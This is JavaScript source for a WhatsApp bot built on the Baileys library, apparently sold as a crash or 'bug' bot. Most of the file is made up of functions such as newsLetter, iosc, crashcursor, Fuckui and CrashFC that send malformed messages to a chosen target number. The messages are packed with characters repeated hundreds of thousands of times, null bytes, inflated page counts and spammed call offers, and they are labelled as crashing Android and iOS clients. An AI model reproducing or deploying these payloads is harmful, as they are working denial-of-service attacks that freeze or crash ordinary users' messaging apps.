
process.on('uncaughtException', console.error)
require("./config")
const { generateMessageIDV2, WA_DEFAULT_EPHEMERAL, getAggregateVotesInPollMessage, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, downloadContentFromMessage, areJidsSameUser, getContentType, useMultiFileAuthState, makeWASocket, fetchLatestBaileysVersion, makeCacheableSignalKeyStore, makeWaSocket } = require("@adiwajshing/baileys")
const fs = require('fs')
const util = require('util')
const axios = require('axios')
const { exec } = require("child_process")
const chalk = require('chalk')
const moment = require('moment-timezone');
const yts = require ('yt-search');
const didyoumean = require('didyoumean');
const similarity = require('similarity')
const pino = require('pino')
const logger = pino({ level: 'debug' });
const JSConfuser = require("js-confuser");
const time = moment(Date.now()).tz('Africa/Nairobi').locale('id').format('HH:mm:ss z')
const crypto = require('crypto');
const path = require('path')
const express = require('express');


module.exports = async (sam, m) => {
try {
const from = m.key.remoteJid
var body = (m.mtype === 'interactiveResponseMessage') ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype == 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ""

const { smsg, fetchJson, getBuffer, fetchBuffer, getGroupAdmins, TelegraPh, isUrl, hitungmundur, sleep, clockString, checkBandwidth, runtime, tanggal, getRandom } = require('./lib2/myfunc')
var budy = (typeof m.text == 'string' ? m.text: '')
var prefix = global.prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : global.prefa ?? global.prefix
const isCmd = body.startsWith(prefix);
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '';
const args = body.trim().split(/ +/).slice(1)
const text = q = args.join(" ")
const sender = m.key.fromMe ? (sam.user.id.split(':')[0]+'@s.whatsapp.net' || sam.user.id) : (m.key.participant || m.key.remoteJid)
const botNumber = await sam.decodeJid(sam.user.id)
const senderNumber = sender.split('@')[0]
const orgkaya = JSON.parse(fs.readFileSync('./database/owner.json'))
const kontributor = JSON.parse(fs.readFileSync('./database/owner.json'))
const premium = JSON.parse(fs.readFileSync('./database/premium.json'))
const isOwner = [botNumber, ...premium, ...kontributor].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const isCreator = (m && m.sender && [botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)) || false;
const pushname = m.pushName || `${senderNumber}`
const isBot = botNumber.includes(senderNumber)


const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const groupMetadata = m.isGroup ? await sam.groupMetadata(from).catch(e => {}) : ''
const groupName = m.isGroup ? groupMetadata.subject : ''
const participants = m.isGroup ? await groupMetadata.participants : ''
const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
const speed = require("performance-now")
//====================================\\
const pic = fs.readFileSync(`./Media/spider.jpg`)
		const music = fs.readFileSync(`./Media/menu.mp3`)
		const bug = fs.readFileSync(`./Media/bug.mp3`)	
const pici = fs.readFileSync('./Media/tdx.jpeg')
//==============================
            
//========================================
const gcq = {

key: {

remoteJid: 'status@broadcast',

fromMe: false,

participant: '0@s.whatsapp.net'

},

message: {

newsletterAdminInviteMessage: {

newsletterJid: `120363224727390375@newsletter`,

newsletterName: `Hore`,

jpegThumbnail: "",

caption: `THANKS FOR BUYING`,

inviteExpiration: Date.now() + 1814400000

}

}}
const reply = async (teks) => {
    await sleep(500)
    return sam.sendMessage(m.chat, {
        contextInfo: {
            mentionedJid: [
                m.sender
            ],
            externalAdReply: {
                showAdAttribution: false,
                renderLargerThumbnail: false,
                title: `𝙳𝚈𝙽𝙰𝙼𝙸𝙲-𝚅3 `,
                body: `𝐛𝐲 𝕶𝖎𝖓𝖌 𝕾𝖆𝖒`,
                previewType: "VIDEO",
                thumbnailUrl: `https://files.catbox.moe/912b7u.jpg`,
                sourceUrl: `${global.url1}`,
                mediaUrl: `${global.url1}`
            }
        },
        text: teks
    }, {
    
    
        quoted: zets
    })
    await sleep(500)
}

		const zets = {
			key: {
				fromMe: false,
				participant: "0@s.whatsapp.net",
				remoteJid: "status@broadcast"
			},
			message: {
				orderMessage: {
					orderId: "2029",
					thumbnail: pic,
					itemCount: `777`,
					status: "INQUIRY",
					surface: "CATALOG",
					message: `𝕶𝖎𝖓𝖌 𝕾𝖆𝖒`,
					token: "AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="
				}
			},
			contextInfo: {
				mentionedJid: [m.sender],
				forwardingScore: 999,
				isForwarded: true
			}
		}
//============
        const downloadMp4 = async (Link) => {
try {
await ytdl.getInfo(Link)
let mp4File = getRandom('.mp4')
let nana = ytdl(Link).pipe(fs.createWriteStream(mp4File)).on('finish', async () => {
await rzx.sendMessage(m.chat, { video: fs.readFileSync(mp4File), gifPlayback: false }, { quoted: m })
fs.unlinkSync(`./${mp4File}`)
})
} catch (err) {
reply(`${err}`)
}
        }

//=========================================//

if (isCmd) {
console.log("");
console.log(chalk.green(chalk.bgHex('#4a69bd').bold(`🚀 WhatsApp messages! 🚀`)));
console.log(chalk.blue(chalk.bgHex('#fdcb6e')(`📅 DATE: ${time}
💬 MESSAGE: ${command}
🗣️ SENDERNAME: ${pushname}
👤 JIDS: ${m.sender}`)));
}
//==========================================//
const qbug = {key: {remoteJid: 'status@broadcast', fromMe: false, participant: '0@s.whatsapp.net'}, message: {listResponseMessage: {title: `Hello My Friends`
}}}
const EsQl = {
			key: {
				remoteJid: 'p',
				fromMe: false,
				participant: '0@s.whatsapp.net'
			},
			message: {
				"interactiveResponseMessage": {
					"body": {
						"text": "Sent",
						"format": "DEFAULT"
					},
					"nativeFlowResponseMessage": {
						"name": "galaxy_message",
						"paramsJson": `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"𝐏𝐫𝐞𝐥 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"𝐏𝐫𝐞𝐥𝐕𝟐\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"⭑̤⟅̊༑ ▾ 𝐏𝐫𝐞𝐥𝐗𝐳 ⿻ 𝐈𝐍͢𝐕𝚫𝐒𝐈͢𝚯𝚴 ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤${"\u0003".repeat(350000)}\",\"screen_0_TextInput_1\":\"INFINITE\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
						"version": 3
					}
				}
			}
}
async function newsLetter1(target) {
            try {
                const messsage = {
                    botInvokeMessage: {
                        message: {
                            newsletterAdminInviteMessage: {
                                newsletterJid: `33333333333333333@newsletter`,
                                newsletterName: "𝑺𝑷𝑰𝑫𝑬𝑹-𝑿" + "ꦾ".repeat(120000),
                                jpegThumbnail: "",
                                caption: "ꦽ".repeat(120000),
                                inviteExpiration: Date.now() + 1814400000,
                            },
                        },
                    },
                };
                await sam.relayMessage(target, messsage, {
                    userJid: target,
                });
            }
            catch (err) {
                console.log('eror');
            }
        }
        
  async function CallGc(target) {
await sam.relayMessage(target, {
            viewOnceMessage: {
                message: {
                    scheduledCallCreationMessage: {
                        callType: "VIDEO",
                        scheduledTimestampMs: Date.now() + 9741,
                        title: " Tama Crash Calls " + `𑲭𑲭`.repeat(100000) + `ꦾ`.repeat(50000),
                        inviteCode: 'youtube.com/@tamainfinity',
                    }
                }
            }
        }, {});
      }      
        
        
 async function newsLetter(target) {
    try {
        const messsage = {
            botInvokeMessage: {
                message: {
                    newsletterAdminInviteMessage: {
                        newsletterJid: `33333333333333333@newsletter`,
                        newsletterName: "[‌‌‌‌‌‌‌‌‌P‌‌‌‌‌‌‌‌‌‌_‌‌‌‌‌‌‌‌‌‌‌L‌‌‌‌‌‌‌‌‌] ‌‌‌‌‌‌‌I‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌S‌‌‌ ‌‌‌‌‌‌C‌‌‌‌‌‌‌‌‌‌‌‌‌‌O‌‌‌‌‌‌‌‌‌‌‌‌M‌‌‌‌‌‌‌‌‌‌‌‌‌I‌‌‌‌‌‌‌‌‌‌‌‌‌N‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌G‌‌‌‌‌‌‌!⟆" + "ꦾ".repeat(120000),
                        jpegThumbnail: null,
                        caption: "ꦽ".repeat(120000),
                        inviteExpiration: Date.now() + 1814400000,
                        nativeFlowMessage: {},
                        buttons: [
                            {
                                name: "call_permission_request",
                                buttonParamsJson: `{"title":"SPIDER-X🔐  ◄${"᬴".repeat(60000)}","sections":[{"title":"# BOOM̷","rows":[]}]}`
                            },
                        ],
                        mentionedJid: ["254742491666@s.whatsapp.net"],
                    },
                },
            },
        };

        await sam.relayMessage(target, messsage, {
            userJid: target,
        });
    } catch (err) {
        console.log('err');
    }
}
    
async function sendOfferCall(target) {

    try {

        await sam.offerCall(target);

        console.log(chalk.white.bold(`Success Send Offer Call To Target`));

    } catch (error) {

        console.error(chalk.white.bold(`Failed Send Offer Call To Target:`, error));

    }

}

async function sendOfferVideoCall(target) {

    try {

        await sam.offerCall(target, { 

        video: true 

        });

        console.log(chalk.white.bold(`Success Send Offer Video Call To Target`));

    } catch (error) {

        console.error(chalk.white.bold(`Failed Send Offer Video Call To Target:`, error));

    }

}
//
async function iosc(target, Ptcp = true) {
sam.relayMessage(
    target,
    {
        extendedTextMessage: {
            text: `𑲭𑲭? ${'ꦾ'.repeat(103000)} ${'@13135550002'.repeat(25000)}`,
            contextInfo: {
                mentionedJid: [
                    "13135550002@s.whatsapp.net",
                    ...Array.from({ length: 15000 }, () => `13135550002${Math.floor(Math.random() * 500000)}@s.whatsapp.net`)
                ],
                stanzaId: "1234567890ABCDEF",
                participant: "13135550002@s.whatsapp.net",
                quotedMessage: {
                    callLogMesssage: {
                        isVideo: true,
                        callOutcome: "1",
                        durationSecs: "0",
                        callType: "REGULAR",
                        participants: [
                            {
                                jid: "13135550002@s.whatsapp.net",
                                callOutcome: "1"
                            }
                        ]
                    }
                },
                remoteJid: "13135550002@s.whastapp.net",
                conversionSource: "source_example",
                conversionData: "Y29udmVyc2lvbl9kYXRhX2V4YW1wbGU=",
                conversionDelaySeconds: 10,
                forwardingScore: 99999999,
                isForwarded: true,
                quotedAd: {
                    advertiserName: "Example Advertiser",
                    mediaType: "IMAGE",
                    jpegThumbnail: Jepeg,
                    caption: "This is an ad caption"
                },
                placeholderKey: {
                    remoteJid: "13135550002@s.whatsapp.net",
                    fromMe: false,
                    id: "ABCDEF1234567890"
                },
                expiration: 86400,
                ephemeralSettingTimestamp: "1728090592378",
                ephemeralSharedSecret: "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
                externalAdReply: {
                    title: "FINIX - CRITICAL FINISH",
                    body: `Ai To Crash ${'\0'.repeat(200)}`,
                    mediaType: "VIDEO",
                    renderLargerThumbnail: true,
                    previewType: "VIDEO",
                    thumbnail: Jepeg,
                    sourceType: "x",
                    sourceId: "x",
                    sourceUrl: "https://www.facebook.com/WhastApp",
                    mediaUrl: "https://www.facebook.com/WhastApp",
                    containsAutoReply: true,
                    showAdAttribution: true,
                    ctwaClid: "ctwa_clid_example",
                    ref: "ref_example"
                },
                entryPointConversionSource: "entry_point_source_example",
                entryPointConversionApp: "entry_point_app_example",
                entryPointConversionDelaySeconds: 5,
                disappearingMode: {},
                actionLink: {
                    url: "https://www.facebook.com/WhatsApp"
                },
                groupSubject: "Example Group Subject",
                parentGroupJid: "13135550002@g.us",
                trustBannerType: "trust_banner_example",
                trustBannerAction: 1,
                isSampled: false,
                utm: {
                    utmSource: "utm_source_example",
                    utmCampaign: "utm_campaign_example"
                },
                forwardedNewsletterMessageInfo: {
                    newsletterJid: "13135550002@newsletter",
                    serverMessageId: 1,
                    newsletterName: "Meta Ai",
                    contentType: "UPDATE",
                    accessibilityText: "Meta Ai"
                },
                businessMessageForwardInfo: {
                    businessOwnerJid: "13135550002@s.whatsapp.net"
                },
                smbriyuCampaignId: "smb_riyu_campaign_id_example",
                smbServerCampaignId: "smb_server_campaign_id_example",
                dataSharingContext: {
                    showMmDisclosure: true
                }
            }
        }
    },
    Ptcp
        ? {
              participant: {
                  jid: target 
              }
          }
        : {}
       
);
console.log("Success! Force Ios Sent")
}



async function xgc(target){
	sam.relayMessage(target,{                viewOnceMessage: {
message: {
                        messageContextInfo: {
                            deviceListMetadataVersion: 2,
                            deviceListMetadata: {},
                        }, 
    "extendedTextMessage": {
        "text": "madara come cu do UrsoZiingod" ,
        "previewType": true,
        "contextInfo": {
            "stanzaId": "B69F7CFEE38571AB03CD9DEEFAD69605",
            "participant": "5518998215209@s.whatsapp.net",
            "quotedMessage": { "documentMessage": {"url":"https://mmg.whatsapp.net/v/t62.7119-24/19973861_773172578120912_2263905544378759363_n.enc?ccb=11-4&oh=01_Q5AaIMqFI6NpAOoKBsWqUR52hN9p5YIGxW1TyJcHyVIb17Pe&oe=6653504B&_nc_sid=5e03e0&mms3=true","mimetype":"application/pdf","fileSha256":"oV/EME/ku/CjRSAFaW+b67CCFe6G5VTAGsIoimwxMR8=","fileLength":null,"pageCount":99999999999999,"contactVcard":true,"caption":'͡𑰵',"mediaKey":"yU8ofp6ZmGyLRdGteF7Udx0JE4dXbWvhT6X6Xioymeg=","fileName": '> cart; ',"fileEncSha256":"0dJ3YssZD1YUMm8LdWPWxz2VNzw5icWNObWWiY9Zs3k=","directPath":"/v/t62.7119-24/19973861_773172578120912_2263905544378759363_n.enc?ccb=11-4&oh=01_Q5AaIMqFI6NpAOoKBsWqUR52hN9p5YIGxW1TyJcHyVIb17Pe&oe=6653504B&_nc_sid=5e03e0","mediaKeyTimestamp":"1714145232","thumbnailDirectPath":"/v/t62.36145-24/32182773_798270155158347_7279231160763865339_n.enc?ccb=11-4&oh=01_Q5AaIGDA9WE26BzZF37Vp6aAsKq56VhpiK6Gdp2EGu1AoGd8&oe=665346DE&_nc_sid=5e03e0","thumbnailSha256":"oFogyS+qrsnHwWFPNBmtCsNya8BJkTlG1mU3DdGfyjg=","thumbnailEncSha256":"G2VHGFcbMP1IYd95tLWnpQRxCb9+Q/7/OaiDgvWY8bM=","jpegThumbnail":"/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABERERESERMVFRMaHBkcGiYjICAjJjoqLSotKjpYN0A3N0A3WE5fTUhNX06MbmJiboyiiIGIosWwsMX46/j///8BERERERIRExUVExocGRwaJiMgICMmOiotKi0qOlg3QDc3QDdYTl9NSE1fToxuYmJujKKIgYiixbCwxfjr+P/////CABEIACIAYAMBIgACEQEDEQH/xAAwAAACAwEBAAAAAAAAAAAAAAADBAACBQYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAA5CpC5601s5+88/TJ01nBC6jmytPTAQuZhpxa2PQ0WjCP2T6LXLJR3Ma5WSIsDXtUZYkz2seRXNmSAY8m/PlhkUdZD//EAC4QAAIBAwIEBAQHAAAAAAAAAAECAAMRIRIxBCJBcQVRgbEQEzIzQmFygsHR4f/aAAgBAQABPwBKSsN4aZERmVVybZxecODVpEsCE2zmIhYgAZMbwjiQgbBNto9MqSCMwiUioJDehvaVBynIJ3xKPDki7Yv7StTC3IYdoLAjT/s0ltpSOhgSAR1BlTi7qUQTw/g3aolU4VTLzxLgg96yb9Yy2gJVgRLKgL1VtfZdyTKdXQrO246dB+UJJJJ3hRAoDWA84p+WRc3U9YANRmlT3nK9NdN9u1jKD1KeNTSsfnmzFiB5Eypw9ADUS4Hr/U1LT+1T9SPcmEaiWJ1N59BKrAcgNxfJ+BV25nNu8QlLE5WJj9J2mhTKTMjAX5SZTo0qYDsVJOxgalWauFtdeonE1NDW27ZEeqpz/F/ePUJHXuYfgxJqQfT6RPtfujE3pwdJQ5uDYNnB3nAABKlh+IzisvVh2hhg3n//xAAZEQACAwEAAAAAAAAAAAAAAAABIAACEWH/2gAIAQIBAT8AYDs16p//xAAfEQABAwQDAQAAAAAAAAAAAAABAAIRICExMgMSQoH/2gAIAQMBAT8ALRERdYpc6+sLrIREUenIa/AuXFH/2Q==","thumbnailHeight":172,"thumbnailWidth":480},forwardingScore: 508,isForwarded: true,forwardedNewsletterMessageInfo: {newsletterJid: "0@newsletter",serverMessageId: 100,newsletterName:"🚔 > ursoziingod & crash;"}}}},
       }}},{})
	}
	
	async function xgc2(target){
		await sam.relayMessage(target, {
'groupInviteMessage': {
"inviteExpiration": Math.floor(Date.now() / 1000) + 31536000,
"groupName":` 𝐃𝐘𝐍𝐀𝐌𝐈𝐂-𝐕𝐈𝐏🏴‍☠️`.repeat(1500),
'groupJid': '120363047626537933@g.us',
'inviteExpiration': '999',
'caption': '> ㅤㅤㅤㅤㅤㅤㅤ',
"inviteCode": 'h+64P9RhJDzgXSPf',
'contextInfo': {
'isForwarded': true,
'fromMe': false,
'participant': '0@s.whatsapp.net',
'remoteJid': sender,
'quotedMessage': {
documentMessage: {
url: "https://mmg.whatsapp.net/v/t62.7119-24/34673265_965442988481988_3759890959900226993_n.enc?ccb=11-4&oh=01_AdRGvYuQlB0sdFSuDAeoDUAmBcPvobRfHaWRukORAicTdw&oe=65E730EB&_nc_sid=5e03e0&mms3=true",
mimetype: "application/pdf",
title: "crash",
pageCount: 1000000000,
fileName: "crash.pdf".repeat(1500),
contactVcard: true
}
},
'forwardedNewsletterMessageInfo': {
'newsletterJid': '120363222395675670@newsletter',
'serverMessageId': 1,
'newsletterName': "𝐃𝐘𝐍𝐀𝐌𝐈𝐂-𝐕𝐈𝐏 🦄".repeat(1500)
}
}
}
}, {});
		}


	


		
//
async function crashcursor(target) {
const stanza = [
{
attrs: { biz_bot: '1' },
tag: "bot",
},
{
attrs: {},
tag: "biz",
},
];

let messagePayload = {
viewOnceMessage: {
message: {
listResponseMessage: {
title: "hello sup i have a message for you " + "ꦽ".repeat(45000),
listType: 2,
singleSelectReply: {
    selectedRowId: "🩸"
},
contextInfo: {
stanzaId: sam.generateMessageTag(),
participant: "0@s.whatsapp.net",
remoteJid: "status@broadcast",
mentionedJid: [target, "13135550002@s.whatsapp.net"],
quotedMessage: {
                buttonsMessage: {
                    documentMessage: {
                        url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
                        mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                        fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
                        fileLength: "9999999999999",
                        pageCount: 3567587327,
                        mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
                        fileName: "bless",
                        fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
                        directPath: "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
                        mediaKeyTimestamp: "1735456100",
                        contactVcard: true,
                        caption: "sebuah kata maaf takkan membunuhmu, rasa takut bisa kau hadapi"
                    },
                    contentText: "༑ Fail Beta - ( 𝕶𝖎𝖓𝖌 𝕾𝖆𝖒 ) \"👋\"",
                    footerText: "© die?",
                    buttons: [
                        {
                            buttonId: "\u0000".repeat(850000),
                            buttonText: {
                                displayText: "girlfie"
                            },
                            type: 1
                        }
                    ],
                    headerType: 3
                }
},
conversionSource: "porn",
conversionData: crypto.randomBytes(16),
conversionDelaySeconds: 9999,
forwardingScore: 999999,
isForwarded: true,
quotedAd: {
advertiserName: " x ",
mediaType: "IMAGE",
jpegThumbnail: pici,
caption: " x "
},
placeholderKey: {
remoteJid: "0@s.whatsapp.net",
fromMe: false,
id: "ABCDEF1234567890"
},
expiration: -99999,
ephemeralSettingTimestamp: Date.now(),
ephemeralSharedSecret: crypto.randomBytes(16),
entryPointConversionSource: "kontols",
entryPointConversionApp: "kontols",
actionLink: {
url: "t.me/devor6core",
buttonTitle: "konstol"
},
disappearingMode:{
initiator:1,
trigger:2,
initiatorDeviceJid: target,
initiatedByMe:true
},
groupSubject: "kontol",
parentGroupJid: "kontolll",
trustBannerType: "kontol",
trustBannerAction: 99999,
isSampled: true,
externalAdReply: {
title: "! sam? - \"𝗋34\" 🩸",
mediaType: 2,
renderLargerThumbnail: false,
showAdAttribution: false,
containsAutoReply: false,
body: "© 2025",
thumbnail: pici,
sourceUrl: "go fuck yourself",
sourceId: "dvx - problem",
ctwaClid: "cta",
ref: "ref",
clickToWhatsappCall: true,
automatedGreetingMessageShown: false,
greetingMessageBody: "kontol",
ctaPayload: "cta",
disableNudge: true,
originalImageUrl: "konstol"
},
featureEligibilities: {
cannotBeReactedTo: true,
cannotBeRanked: true,
canRequestFeedback: true
},
forwardedNewsletterMessageInfo: {
newsletterJid: "120363274419384848@newsletter",
serverMessageId: 1,
newsletterName: `TrashDex 𖣂      - 〽${"ꥈꥈꥈꥈꥈꥈ".repeat(10)}`,
contentType: 3,
accessibilityText: "kontol"
},
statusAttributionType: 2,
utm: {
utmSource: "utm",
utmCampaign: "utm2"
}
},
description: "by : 𝕶𝖎𝖓𝖌 𝕾𝖆𝖒"
},
messageContextInfo: {
messageSecret: crypto.randomBytes(32),
supportPayload: JSON.stringify({
version: 2,
is_ai_message: true,
should_show_system_message: true,
ticket_id: crypto.randomBytes(16),
}),
},
}
}
}

await sam.relayMessage(target, messagePayload, {
additionalNodes: stanza,
participant: { jid : target }
});
}
//


async function Fuckui(target) {
  try {
    let message = {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
          },
          interactiveMessage: {
            contextInfo: {
              mentionedJid: [target],
              isForwarded: true,
              forwardingScore: 999,
              businessMessageForwardInfo: {
                businessOwnerJid: target,
              },
            },
            body: {
              text: "FUCK UI",
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "",
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
              ],
            },
          },
        },
      },
    };

    await sam.relayMessage(target, message, {
      participant: { jid: target },
    });
  } catch (err) {
    console.log(err);
  }
}

async function InvisibleLoadFast(target) {
      try {
        let message = {
          viewOnceMessage: {
            message: {
              messageContextInfo: {
                deviceListMetadata: {},
                deviceListMetadataVersion: 2,
              },
              interactiveMessage: {
                contextInfo: {
                  mentionedJid: [target],
                  isForwarded: true,
                  forwardingScore: 999,
                  businessMessageForwardInfo: {
                    businessOwnerJid: target,
                  },
                },
                body: {
                  text: "𝓭ץⓝ𝐀ᵏᎥ𝕃𝕃",
                },
                nativeFlowMessage: {
                  buttons: [
                    {
                      name: "single_select",
                      buttonParamsJson: "",
                    },
                    {
                      name: "call_permission_request",
                      buttonParamsJson: "",
                    },
                    {
                      name: "mpm",
                      buttonParamsJson: "",
                    },
                    {
                      name: "mpm",
                      buttonParamsJson: "",
                    },
                    {
                      name: "mpm",
                      buttonParamsJson: "",
                    },
                    {
                      name: "mpm",
                      buttonParamsJson: "",
                    },
                  ],
                },
              },
            },
          },
        };

        await sam.relayMessage(target, message, {
          participant: { jid: target },
        });
      } catch (err) {
        console.log(err);
      }
    }
  //
  async function forcec(nomor) {
     let target = nomor
     let msg = await generateWAMessageFromContent(target, {
                viewOnceMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                title: "𝓭ץⓝ𝐀ᵏᎥ𝕃𝕃",
                                hasMediaAttachment: false
                            },
                            body: {
                                text: "𝓭ץⓝ𝐀ᵏᎥ𝕃𝕃"
                            },
                            nativeFlowMessage: {
                                messageParamsJson: "",
                                buttons: [{
                                        name: "single_select",
                                        buttonParamsJson: "z"
                                    },
                                    {
                                        name: "call_permission_request",
                                        buttonParamsJson: "{}"
                                    }
                                ]
                            }
                        }
                    }
                }
            }, {});

            await sam.relayMessage(target, msg.message, {
                messageId: msg.key.id,
                participant: { jid: target }
            });
        }
        async function test(nomor) {
    let target = nomor;
    let msg = await generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        title: "𝓭ץⓝ𝐀ᵏᎥ𝕃𝕃",
                        hasMediaAttachment: false
                    },
                    body: {
                        text: "𝓭ץⓝ𝐀ᵏᎥ𝕃𝕃"
                    },
                    nativeFlowMessage: {
                        messageParamsJson: "",
                        buttons: [
                            {
                                name: "single_select",
                                buttonParamsJson: "z"
                            },
                            {
                                name: "call_permission_request",
                                buttonParamsJson: "{}"
                            }
                        ]
                    }
                }
            }
        }
    }, {});

    
    await sam.relayMessage(target, msg.message, {
        messageId: msg.key.id
        
    });
}
  async function CrashFC(target) {
  return {
    viewOnceMessage: {
      message: {
        listResponseMessage: {
          title: "𝓭ץⓝ𝐀ᵏᎥ𝕃𝕃" + "ꦽ".repeat(45000),
          listType: 2,
          singleSelectReply: {
            selectedRowId: "🩸",
          },
          contextInfo: {
            stanzaId: crypto.randomBytes(16).toString("hex"),
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            mentionedJid: [targetNumber, "13135550002@s.whatsapp.net"],
            quotedMessage: {
              buttonsMessage: {
                documentMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
                  mimetype:
                    "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
                  fileLength: "9999999999999",
                  pageCount: 3567587327,
                  mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
                  fileName: "PL",
                  fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
                  directPath:
                    "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
                  mediaKeyTimestamp: "1735456100",
                  contactVcard: true,
                  caption:
                    "supi",
                },
                contentText: '༑ Fail Beta - ( devorsixcore ) "👋"',
                footerText: "© running since 2020 to 20##?",
                buttons: [
                  {
                    buttonId: "\u0000".repeat(900000),
                    buttonText: {
                      displayText: "𐎟 𝐓𝐝͢𝐗 ⿻ 𝐂͢𝐋𝐢𝚵͢𝐍𝐓͢ 𐎟",
                    },
                    type: 1,
                  },
                ],
                headerType: 3,
              },
            },
            conversionSource: "porn",
            conversionData: crypto.randomBytes(16),
            conversionDelaySeconds: 9999,
            forwardingScore: 999999,
            isForwarded: true,
            quotedAd: {
              advertiserName: " x ",
              mediaType: "IMAGE",
              jpegThumbnail: null,
              caption: " x ",
            },
            placeholderKey: {
              remoteJid: "0@s.whatsapp.net",
              fromMe: false,
              id: "ABCDEF1234567890",
            },
            expiration: -99999,
            ephemeralSettingTimestamp: Date.now(),
            ephemeralSharedSecret: crypto.randomBytes(16),
            entryPointConversionSource: "kontols",
            entryPointConversionApp: "kontols",
            actionLink: {
              url: "t.me/jackthexbec",
              buttonTitle: "konstol",
            },
            disappearingMode: {
              initiator: 1,
              trigger: 2,
              initiatorDeviceJid: targetNumber,
              initiatedByMe: true,
            },
            groupSubject: "kontol",
            parentGroupJid: "kontolll",
            trustBannerType: "kontol",
            trustBannerAction: 99999,
            isSampled: true,
            externalAdReply: {
              title: "I𝓭ץⓝ𝐀ᵏᎥ𝕃𝕃",
              mediaType: 2,
              renderLargerThumbnail: false,
              showAdAttribution: false,
              containsAutoReply: false,
              body: "IƧ ΛᄂIVΣ",
              thumbnail: null,
              sourceUrl: "go fuck yourself",
              sourceId: "dvx - problem",
              ctwaClid: "cta",
              ref: "ref",
              clickToWhatsappCall: true,
              automatedGreetingMessageShown: false,
              greetingMessageBody: "kontol",
              ctaPayload: "cta",
              disableNudge: true,
              originalImageUrl: "konstol",
            },
            featureEligibilities: {
              cannotBeReactedTo: true,
              cannotBeRanked: true,
              canRequestFeedback: true,
            },
            forwardedNewsletterMessageInfo: {
